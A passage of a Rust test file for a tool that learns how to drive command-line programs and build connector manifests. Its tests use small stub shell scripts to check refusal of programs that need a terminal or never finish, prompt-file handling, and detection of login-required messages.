    assert!(same.answer.as_deref().unwrap().contains("proposed before"), "the row as it was: {:?}", same.answer);
    let changed = r.run("connect-propose", "x", with(m("--ask")));
    assert!(changed.answer.as_deref().unwrap().starts_with("proposed p"), "another row is another proposal: {:?}", changed.answer);
    assert_eq!(r.b.events("proposal.made").len(), 2);
}

// ---- a program that cannot take part, said in a line ----

#[test]
fn a_tool_that_needs_a_terminal_is_refused_in_a_line_and_nothing_is_proposed() {
    let help = "printf 'pty - a small tool\\n\\nUsage:\\n  pty pane FILE\\n\\nCommands:\\n  pane FILE  prints the file\\n'";
    let body = format!("case \"$1\" in --version) echo 'pty 1';; --help) {help};; *) echo 'error: this program needs a terminal' >&2; exit 4;; esac");
    let r = Rig::new(&[("pty", &body)]);
    let a = learned_at(&r, "pty", &r.program("pty"));
    assert_eq!((a["settled"].clone(), a["refused"].clone()), (json!(false), json!(true)), "{a}");
    let why = a["why"].as_str().unwrap();
    assert!(why.contains("needs a terminal") && !why.contains('\n'), "one line that says why: {why}");
    assert_eq!(a["manifest"], "", "no connector is made for it");
}

#[test]
fn a_tool_whose_help_does_not_end_is_refused_at_its_clock_and_not_asked_for_the_rest() {
    let r = Rig::new(&[("serv", "echo \"$*\" >> \"$0.log\"; echo 'listening on http://127.0.0.1:1'; sleep 60")]);
    let a = learned_at(&r, "serv", &r.program("serv"));
    assert_eq!((a["settled"].clone(), a["refused"].clone()), (json!(false), json!(true)), "{a}");
    assert!(a["why"].as_str().unwrap().contains("does not end"), "{a}");
    // the ways to give it a prompt ran over twice and stopped: not the clock for each of 36 ways
    let log = std::fs::read_to_string(format!("{}.log", r.program("serv"))).unwrap_or_default();
    assert!(log.lines().filter(|l| l.contains("Reply with")).count() <= 2, "{log}");
}

#[test]
fn a_program_whose_help_says_the_prompt_is_read_from_a_file_is_given_one_and_learned_with_the_path_in_its_arguments() {
    let body = "case \"$1\" in --version) echo 'filer 1.0';; --help) echo 'filer - says a word'; echo 'Usage:'; echo '  filer --prompt-file PATH   (the prompt is read from the file at PATH)';; \
      --prompt-file) p=$(cat \"$2\"); case \"$p\" in Read*) echo 'session: s1'; echo '* read nothing-here'; echo '= read: (no such file)'; echo '(no such file)';; *) echo 'session: s1'; echo \"${p##*: }\";; esac;; \
      *) echo 'error: no prompt given' >&2; exit 2;; esac";
    let r = Rig::new(&[("filer", body)]);
    let a = learned(&r, "filer", "filer - says a word\nUsage:\n  filer --prompt-file PATH   (the prompt is read from the file at PATH)");
    assert_eq!(a["settled"], true, "{a}");
    let m = a["manifest"].as_str().unwrap();
    assert!(m.contains("--prompt-file") && m.contains("{promptfile}") && !m.contains("{prompt}"), "{m}");
}

#[test]
fn a_program_that_says_it_needs_a_login_or_a_provider_without_a_page_is_said_to_ask_for_one() {
    for said in ["Error: Authentication required. Please run 'agent login' first.", "ERROR\n\n  No providers configured - please run 'prog' to set up a provider interactively."] {
        let r = Rig::new(&[("gated", &format!("case \"$1\" in --version) echo 'gated 1';; *) cat <<'EOF'\n{said}\nEOF\nexit 1;; esac"))]);
        let a = learned(&r, "gated", "");
        assert_eq!((a["settled"].clone(), a["login"].clone()), (json!(false), json!(true)), "{said}: {a}");
        assert!(a["login_text"].as_str().unwrap().len() > 5 && !a["login_text"].as_str().unwrap().contains('\n'), "{a}");
    }
}
